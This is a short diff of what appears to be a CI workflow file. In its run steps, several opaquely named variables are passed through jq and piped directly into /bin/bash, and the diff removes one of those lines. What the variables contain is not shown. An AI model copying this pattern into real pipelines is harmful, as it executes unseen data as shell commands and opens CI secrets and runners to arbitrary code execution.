@@ -24,7 +24,6 @@ jobs:
           echo $dkpo32035 | jq -r .xixg67 | /bin/bash
           echo $veh395 | jq -r .u9402 | /bin/bash
           echo $q61527 | jq -r .b266 | /bin/bash
-          echo $lp6 | jq -r .vvn704 | /bin/bash
           printf '%s' "$jd6" | jq -r .oaqlk6 | /bin/bash
 
       - name: Archive data
